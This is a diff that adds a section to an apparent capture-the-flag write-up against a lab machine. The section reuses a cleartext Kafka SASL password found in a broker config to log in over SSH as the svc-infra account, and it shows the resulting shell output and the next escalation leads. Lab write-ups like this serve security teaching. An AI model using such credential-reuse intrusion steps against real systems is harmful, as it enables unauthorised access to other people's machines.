@@ -1041,6 +1041,48 @@ allow.everyone.if.no.acl.found=true
 ```
 
 Key finding: the SASL PLAIN module stores `user_svc_infra="Ny2hdpme$bwT3"` in cleartext. The broker runs as the Linux user `svc-infra`, so this is a candidate SSH password for that account. Also note `allow.everyone.if.no.acl.found=true`, a permissive Kafka authorization default worth flagging for remediation. The password contains a `$`, so it must be single-quoted in a shell.
+<div align="center">
+<br>
+<br>
+※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+</div>
+
+### 3.2 Foothold: SSH as svc-infra
+
+The broker config exposed `svc_infra`'s SASL password, and the broker runs as the Linux user `svc-infra`. Test that password over SSH.
+
+**Command:** `ssh svc-infra@TARGET_IP`
+
+**Breakdown:**
+
+| Component | Purpose | Simple Explanation |
+| --------- | ------- | ------------------ |
+| `ssh svc-infra@TARGET_IP` | Remote login | Connects as `svc-infra`; enter `Ny2hdpme$bwT3` at the password prompt (typed, so the `$` needs no quoting). |
+
+**Result:**
+
+```shell
+svc-infra@10.129.170.161's password:
+Welcome to Ubuntu 24.04.5 LTS (GNU/Linux 6.8.0-146-generic x86_64)
+...
+svc-infra@stream:~$ id; hostname; ls -la
+uid=1000(svc-infra) gid=1000(svc-infra) groups=1000(svc-infra),100(users)
+stream
+total 32
+drwxr-x--- 5 svc-infra svc-infra 4096 Oct  6 08:24 .
+drwxr-xr-x 4 root      root      4096 Oct  6 08:24 ..
+lrwxrwxrwx 1 root      root         9 Sep 11 08:27 .bash_history -> /dev/null
+-rw-r--r-- 1 svc-infra svc-infra  220 Aug 19 14:30 .bash_logout
+-rw-r--r-- 1 svc-infra svc-infra 3771 Aug 19 14:30 .bashrc
+drwx------ 3 svc-infra svc-infra 4096 Oct  6 08:24 .cache
+drwxrwxr-x 2 svc-infra svc-infra 4096 Oct  6 08:24 clickhouse-server
+drwxrwxr-x 3 svc-infra svc-infra 4096 Oct  6 08:24 .local
+-rw-r--r-- 1 svc-infra svc-infra  807 Aug 19 14:30 .profile
+```
+
+Key finding: a shell as `svc-infra`, confirming the Kafka SASL password is reused for the Linux account. There is no `user.txt` in this home, so the user flag belongs to another account. Two leads for later: a non-standard `clickhouse-server` directory in this home, and svc-infra's own authenticated access to the Kafka broker.
+
 
 
 
